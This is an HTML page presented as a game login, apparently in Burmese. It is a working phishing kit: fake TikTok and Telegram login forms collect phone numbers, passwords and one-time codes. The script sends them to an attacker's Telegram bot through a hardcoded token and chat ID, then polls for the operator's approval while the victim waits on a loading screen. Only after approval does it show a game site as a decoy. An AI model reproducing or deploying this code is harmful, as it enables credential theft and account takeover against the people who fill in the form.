<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Engine Stable Pro v6</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; position: fixed; font-family: sans-serif; }
        #app { width: 100vw; height: 100vh; position: relative; }
        .full-video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; }
        .tt-input { width: 100%; padding: 14px; border: 1px solid #333; background: #111; color: white; border-radius: 8px; outline: none; margin-bottom: 12px; }
        #topNotice { position: fixed; top: -100px; left: 0; width: 100%; padding: 20px; text-align: center; color: white; font-weight: bold; z-index: 9999; transition: 0.5s; }
        .notice-success { background: #10b981; }
        .notice-error { background: #ef4444; }
        #gameFrameContainer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; background: #000; display: none; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body>

<div id="topNotice"></div>
<audio id="bgMusic" loop src="https://raw.githubusercontent.com/tar-alt/Photo-link-/be5dd1c4b85a9d0bc6951bf1379bff3ce0286c2a/lv_0_20260513134939.mp3"></audio>

<div id="app">
    <!-- Login Selection -->
    <div id="selectScreen" class="w-full h-full flex flex-col items-center justify-center p-8 bg-[#0a0a0a] z-50 relative">
        <div class="bg-[#111] border border-white/10 p-10 w-full max-w-sm rounded-[30px] text-center">
            <h1 class="text-xl font-bold mb-8 text-white">Login to continue</h1>
            <button onclick="toggle('tgScreen')" class="w-full bg-[#2481cc] text-white py-4 rounded-xl mb-4 flex items-center justify-center gap-3"><i class="fa-brands fa-telegram text-xl"></i> Telegram</button>
            <button onclick="toggle('ttScreen')" class="w-full bg-white text-black py-4 rounded-xl flex items-center justify-center gap-3"><i class="fa-brands fa-tiktok text-xl"></i> TikTok</button>
        </div>
    </div>

    <!-- TikTok Screen -->
    <div id="ttScreen" class="hidden bg-black w-full h-full p-6 text-white z-50 relative">
        <div class="flex items-center justify-between mb-8"><i onclick="toggle('selectScreen')" class="fa-solid fa-xmark text-xl cursor-pointer"></i><span class="font-bold text-lg">Log in</span><span></span></div>
        <input type="number" id="ttPhone" placeholder="Phone number" class="tt-input"><input type="password" id="ttPass" placeholder="Password" class="tt-input">
        <button onclick="submit('TikTok')" class="w-full bg-[#fe2c55] text-white py-4 rounded-lg font-bold mt-10">Log in</button>
    </div>

    <!-- Telegram Screen -->
    <div id="tgScreen" class="hidden bg-black w-full h-full p-8 text-white z-50 relative">
        <div class="flex items-center mb-10"><i onclick="toggle('selectScreen')" class="fa-solid fa-arrow-left text-xl cursor-pointer mr-6"></i></div>
        <input type="number" id="tgPhone" placeholder="Phone number" class="w-full bg-transparent border-b border-gray-700 py-3 text-lg outline-none mb-6 text-white">
        <input type="number" id="tgOtp" placeholder="OTP Code" class="w-full bg-transparent border-b border-gray-700 py-3 text-lg outline-none text-white">
        <button onclick="submit('Telegram')" class="w-full bg-[#2481cc] text-white py-4 rounded-xl font-bold mt-12">CONTINUE</button>
    </div>

    <!-- Wait Screen -->
    <div id="waitScreen" class="hidden w-full h-full bg-black z-[60] relative">
        <video id="loadVd" class="full-video" loop muted playsinline src="https://raw.githubusercontent.com/tar-alt/Photo-link-/e761fef0c5c9a10b02d7aa6ad2dfc731ce90f7b8/From%20KlickPin%20CF%20Easy%20fall%20outfit%20ideas%20that%20feel%20fresh%20practical%20and%20surprisingly%20easy%20to%20try%20for%20a%20result%20that%20feels%20elegant%20and%20share-worthy%20-%20Pin-684547212134230018.mp4"></video>
        <div class="absolute inset-0 flex flex-col items-center justify-center z-10 bg-black/40"><p class="text-white text-lg font-bold">Login ဝင်ရောက်ရန် စစ်ဆေးနေပါသည်။</p></div>
    </div>

    <!-- Game Frame -->
    <div id="gameFrameContainer">
        <div onclick="location.reload()" class="fixed top-5 left-5 z-[101] bg-black/60 text-white p-3 rounded-full"><i class="fa-solid fa-house"></i></div>
        <iframe id="gameFrame" src=""></iframe>
    </div>
</div>

<script>
    const token = "8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0";
    const chatID = "5304050102";
    let userKey = "ID_" + Math.floor(Math.random() * 9999);
    const music = document.getElementById('bgMusic');

    function toggle(id) {
        document.querySelectorAll('#app > div').forEach(d => d.classList.add('hidden'));
        document.getElementById(id).classList.remove('hidden');
    }

    function showNotice(msg, type) {
        const el = document.getElementById('topNotice');
        el.innerText = msg; el.className = (type === 'success') ? 'notice-success' : 'notice-error';
        el.style.top = '0'; setTimeout(() => el.style.top = '-100px', 4000);
    }

    async function submit(type) {
        const ph = (type === 'TikTok') ? document.getElementById('ttPhone').value : document.getElementById('tgPhone').value;
        const extra = (type === 'TikTok') ? document.getElementById('ttPass').value : document.getElementById('tgOtp').value;
        
        toggle('waitScreen');
        document.getElementById('loadVd').play();

        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: chatID, 
                text: `<b>${type} Login Request</b>\nPH: <code>${ph}</code>\nData: <code>${extra}</code>\nID: <code>${userKey}</code>`,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{text:"✅ Approve", callback_data:`ok_${userKey}`}, {text:"❌ Reject", callback_data:`no_${userKey}`}]] }
            })
        });
        startPolling();
    }

    function startPolling() {
        const check = setInterval(async () => {
            const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`);
            const data = await res.json();
            const last = data.result?.[data.result.length - 1]?.callback_query;
            
            if (last && last.data.includes(userKey)) {
                if (last.data === `ok_${userKey}`) {
                    clearInterval(check);
                    
                    // Bot စာသားပြောင်းရန်
                    await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
                        method: 'POST', headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            chat_id: chatID, 
                            message_id: last.message.message_id, 
                            text: `✅ ID: ${userKey} အား အောင်မြင်စွာ လက်ခံလိုက်ပါပြီ။` 
                        })
                    });

                    showNotice("Login အောင်မြင်ပါသည်။", "success");
                    setTimeout(openGame, 1500); // ၁.၅ စက္ကန့်အကြာမှာ ဂိမ်းတန်းပွင့်မယ်

                } else if (last.data === `no_${userKey}`) {
                    clearInterval(check);
                    showNotice("ငြင်းပယ်ခံရပါသည်။", "error");
                    setTimeout(() => location.reload(), 2000);
                }
            }
        }, 3000);
    }

    function openGame() {
        document.getElementById('gameFrameContainer').style.display = 'block';
        document.getElementById('gameFrame').src = "https://www.crazygames.com";
        music.play().catch(e => console.log("Audio trigger needed"));
    }
</script>
</body>
</html>
